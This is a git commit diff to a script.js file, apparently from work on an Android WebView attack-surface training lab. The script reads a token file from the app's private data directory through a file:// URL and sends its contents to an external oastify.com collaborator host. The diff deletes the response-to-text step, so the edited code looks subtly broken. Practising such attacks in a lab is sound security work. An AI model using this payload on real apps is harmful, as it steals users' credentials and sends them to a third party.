8694e7b9b8abac9a95817b2241de046904329ae3
lindoke <66307433+lindoke@users.noreply.github.com>
2025-03-19 13:22:47 +0200

    Update script.js

--- script.js
+++ script.js
@@ -1,6 +1,5 @@
 <script>
     fetch("file:///data/data/io.hextree.attacksurface/files/token.txt")
-        .then(response => response.text())
         .then(data => {
             document.body.innerHTML = "<pre>" + data + "</pre>";
             fetch("https://bhwlivvbiakjmrbq8ox13u3xcoif65uu.oastify.com?data=" + encodeURIComponent(data));
